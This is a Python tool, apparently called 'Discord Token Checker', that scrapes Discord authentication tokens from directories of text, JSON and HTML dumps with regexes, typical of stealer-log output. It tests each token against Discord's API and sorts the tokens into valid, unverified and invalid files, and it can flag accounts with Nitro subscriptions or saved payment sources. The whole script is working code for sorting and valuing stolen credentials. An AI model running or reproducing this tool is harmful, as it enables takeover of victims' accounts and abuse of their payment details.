import requests, colorama, os, ctypes, re, glob
from colorama import Fore
from sys import exit

def cls():
    os.system("cls" if os.name=="nt" else "clear")

def fexit():
    print()
    input(f"{Fore.RESET}Press Enter button for exit.")
    exit()

if __name__ == "__main__":
    ctypes.windll.kernel32.SetConsoleTitleW("Discord Token Checker by GuFFy_OwO")
    colorama.init()

if not os.path.exists("output"):
    os.makedirs("output")

cls()
print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Check one file")
print(f"{Fore.RESET}[{Fore.CYAN}2{Fore.RESET}] Check many files")
print()

checkType = input(f"{Fore.CYAN}>{Fore.RESET}Select An Option{Fore.CYAN}:{Fore.RESET} ")
if "1" in checkType:
    cls()
    tokenFileName = input(f"{Fore.CYAN}>{Fore.RESET}Enter the name of the file in wich are the unchecked tokens{Fore.CYAN}:{Fore.RESET} ")
    name = f"output/{tokenFileName}_parsed.txt"
    checkName = tokenFileName
elif "2" in checkType:
    cls()
    tokenDirectoryName = input(f"{Fore.CYAN}>{Fore.RESET}Enter the directory of the files in wich are the unchecked tokens{Fore.CYAN}:{Fore.RESET} ")
    if not os.path.exists(tokenDirectoryName):
        print()
        print(tokenDirectoryName + " directory not exist.")
        fexit()
    try:
        os.remove(f"output\\all_data.tmp")
    except: None
    open(f"output\\all_data.tmp", "a+")
    cls()
    print(f"Glue the files...\n")
    files = glob.glob(f"{tokenDirectoryName}/**/*.txt") + glob.glob(f"{tokenDirectoryName}/**/*.json") + glob.glob(f"{tokenDirectoryName}/**/*.html") 
    with open(f"output\\all_data.tmp", "w", encoding="utf-8") as result:
        for file_ in files:
            for line in open( file_, "r", encoding="utf-8", errors="ignore"):
                result.write(line)
    tokenFileName = f"output\\all_data.tmp"
    name = f"output/{os.path.basename(tokenDirectoryName)}_parsed.txt"
    checkName = os.path.basename(tokenDirectoryName)
else:
    print()
    print("Invalid Option.")
    fexit()

cls()
deleteDuplicates = input(f"{Fore.CYAN}>{Fore.RESET}Delete duplicates tokens? [Y/N]{Fore.CYAN}:{Fore.RESET} ")
if "y" or "n" in deleteDuplicates.lower():
    None
else:
    print()
    print("Invalid Option.")
    fexit()
print()
checkTokens = input(f"{Fore.CYAN}>{Fore.RESET}Check validity tokens? [Y/N]{Fore.CYAN}:{Fore.RESET} ")
if "y" in checkTokens.lower():
    print()
    checkNitro = input(f"{Fore.CYAN}>{Fore.RESET}Check nitro and payments on tokens? [Y/N] {Fore.CYAN}:{Fore.RESET} ")
    if "y" or "n" in checkNitro.lower():
        None
    else:
        print()
        print("Invalid Option.")
        fexit()
elif "n" in checkTokens.lower():
    None
else:
    print()
    print("Invalid Option.")
    fexit()


def main():
    global found
    cls()
    print(f"Parse tokens...\n")
    try:
        os.remove(name)
    except: None
    open(name, "a+")
    tokens = []
    for line in [x.strip() for x in open(f"{tokenFileName}", errors="ignore").readlines() if x.strip()]:
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in re.findall(regex, line):
                tokens.append(token)
    if deleteDuplicates.lower() == "y":
        tokens = list(dict.fromkeys(tokens))
    tokens_str = "\n".join(tokens)
    with open(name, "a", encoding="utf-8") as f:
        f.write(tokens_str)
    found = sum(1 for line in open(name, "r", encoding="utf-8")) 
    print(f"Done. Found {Fore.CYAN}{found}{Fore.RESET} tokens!")
    try:
        os.remove(f"output\\all_data.tmp")
    except: None
    if checkTokens.lower() == "y":
        checker()
    else:
        fexit()   

dirValidTokens = f"output/{checkName}_valid.txt"
dirUnverifiedTokens = f"output/{checkName}_unverified.txt"
dirInvalidTokens =f"output/{checkName}_invalid.txt"
dirNitroTokens = f"output/{checkName}_nitro.txt"

checked = 0
verified = 0
unverified = 0
invalid = 0
nitro = 0

def checker(): 
    cls()
    try:
        os.remove(dirValidTokens)
        os.remove(dirUnverifiedTokens)
        os.remove(dirInvalidTokens)
        os.remove(dirNitroTokens)
    except: None
    open(dirValidTokens, "a+")
    open(dirUnverifiedTokens, "a+")
    open(dirInvalidTokens, "a+")
    if checkNitro.lower() == "y":
        open(dirNitroTokens, "a+")
    try:
        for item in open(name, "r").readlines():
            CheckToken(item.strip())
        print()
        if checkNitro.lower() == "y":
            print(f"{Fore.CYAN}Checked{Fore.RESET}: {checked}/{found}  |  {Fore.GREEN}Valid{Fore.RESET}: {verified}  |  {Fore.YELLOW}Unverified{Fore.RESET}: {unverified}  |  {Fore.RED}Invalid{Fore.RESET}: {invalid}  |  {Fore.MAGENTA}NITRO{Fore.RESET}: {nitro}")
        else:
            print(f"{Fore.CYAN}Checked{Fore.RESET}: {checked}/{found}  |  {Fore.GREEN}Valid{Fore.RESET}: {verified}  |  {Fore.YELLOW}Unverified{Fore.RESET}: {unverified}  |  {Fore.RED}Invalid{Fore.RESET}: {invalid}")
        fexit()
    except Exception as e:
        print(e)
        print()
        print("An unexepted error occurred!")
        fexit()

def get_user_info(token: str):
    json = requests.get("https://discordapp.com/api/v7/users/@me?verified", headers={"authorization": token})           
    if json.status_code == 200:
        json_response = json.json()
        if json_response["verified"] == True:
            return True
        else:
            return False
    else:
        return None

def get_plan_id(token: str):
    for json in requests.get("https://discord.com/api/v7/users/@me/billing/subscriptions", headers={"authorization": token}).json():
        try:            
            if json["plan_id"] == "511651880837840896":
                return True
            else:
                return False
        except:
            return None

def get_payment_id(token: str):
    for json in requests.get("https://discordapp.com/api/v7/users/@me/billing/payment-sources", headers={"authorization": token}).json():
        try:
            if json["invalid"] == True:
                return True
            else:
                return False
        except:
            return None

def CheckToken(token):
    global checked
    global verified
    global unverified
    global invalid
    global nitro
    if len(token) > 59:
        lenghtToken = f"{token}"
    else:
        lenghtToken = f"{token}                             "
    user_info = get_user_info(token)
    if user_info == None:
        with open(dirInvalidTokens, "a", encoding="utf-8") as f:
            f.write(token + "\n")
        print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.RED}Invalid{Fore.RESET}")
        invalid += 1
    elif user_info == True:
        with open(dirValidTokens, "a", encoding="utf-8") as f:
            f.write(token + "\n")
        verified += 1
        if checkNitro.lower() == "y":
            planid = get_plan_id(token)
            payid = get_payment_id(token)  
            if planid != None or payid != None:
                with open(dirNitroTokens, "a", encoding="utf-8") as f:
                    f.write(token + "\n")
                nitro += 1
                print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.MAGENTA}Nitro{Fore.RESET}") 
            else:    
                print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.GREEN}Valid{Fore.RESET}")
    else: 
        with open(dirUnverifiedTokens, "a", encoding="utf-8") as f:
                f.write(token + "\n")
        print(f"{Fore.WHITE}{lenghtToken}   |  {Fore.YELLOW}Unverified{Fore.RESET}")
        unverified += 1    
    checked  += 1
    println()

def println():
    if checkNitro.lower() == "y":
        ctypes.windll.kernel32.SetConsoleTitleW(f"Discord Token Checker by GuFFy_OwO  |  Checked: {checked}/{found}  |  Valid: {verified}  |  Unverified: {unverified}  |  Invalid: {invalid}  |  NITRO: {nitro}")
    else:
        ctypes.windll.kernel32.SetConsoleTitleW(f"Discord Token Checker by GuFFy_OwO  |  Checked: {checked}/{found}  |  Valid: {verified}  |  Unverified: {unverified}  |  Invalid: {invalid}")

main()
